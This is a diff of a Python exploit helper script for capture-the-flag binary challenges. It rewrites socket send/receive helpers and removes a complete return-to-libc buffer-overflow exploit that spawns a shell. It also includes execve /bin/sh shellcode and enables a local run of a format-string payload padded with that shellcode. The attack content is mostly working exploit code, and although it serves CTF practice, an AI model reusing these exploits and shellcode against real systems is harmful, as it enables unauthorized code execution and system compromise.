@@ -23,30 +23,31 @@ def sock(remoteip="127.0.0.1", remoteport=4444):
     s.connect((remoteip, remoteport))
     time.sleep(0.5)
 
+def splitn(data, n):
+    length = len(data)
+    return [data[i:i+n] for i in range(0, length, n)]
+
 def writefile(buf_arg,file_name):
     with open(file_name, 'wb') as f:
         f.write(buf_arg)
 
-def recv(delim='\n', out=1):
+def recv(delim='\n'):
     data = ''
     while not data.endswith(delim):
         data += s.recv(1)
-    if(out == 1):
-        print('\nrecv: \n' + data + '\n')
+    print('\nrecv: \n' + data + '\n')
     return data
 
-def recvn(x=1024, out=1):
+def recvn(x):
     data = ''
     data += s.recv(x)
-    if(out == 1):
-        print('\nrecv: \n' + data + '\n')
+    print('\nrecv: \n' + data + '\n')
     return data
 
-def send(x, sleep=0.3, out=1):
+def send(x):
     s.sendall(x + '\n')
-    if(out == 1):
-        print('\nsend: \n' + x + '\n')
-    time.sleep(sleep)
+    print('\nsend: \n' + x + '\n')
+    time.sleep(0.3)
 
 def u(x):
     return struct.unpack("<I",x[:4])[0]
@@ -133,51 +134,6 @@ sc_execve64 = "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\
 
 #-----------START EXPLOIT CODE-----------#
 
-#miyactf/100questions
-
-system = 0xb7e53310
-binsh = 0xb7f75bac
-
-sock('localhost', 4444)
-
-num = recv(' ')
-a = int(recv(' '))
-mark = recv(' ')
-b = int(recv(' '))
-recvn(1024, 0)
-send(str(a + b), 0)
-recv('\n')
-while(1):
-    num = recv(' ')
-    if not(num.count('[')):
-        break
-    a = int(recv(' '))
-    mark = recv(' ')
-    b = int(recv(' '))
-    recvn(1024, 0)
-    send(str(a + b), 0)
-    recv('\n')
-
-recvn()
-#raw_input('wait')
-
-buf = ''
-buf += 'a'*128
-buf += p(system)
-buf += 'bbbb'
-buf += p(binsh)
-#buf = 'hogehoge'
-
-send(buf)
-recvn()
-shell()
-
-
-###################################################################
-
-
-#momo/12
-
 ##########################
 # [+]pattern01: momo-tech
 ##########################
@@ -236,4 +192,5 @@ buf = ''
 buf += p.payload(idx)
 buf += 'A'*(1024-len(buf))
 buf += sc_execve32
-#local(cmd + ' ' + buf)
+local(cmd + ' ' + buf)
+
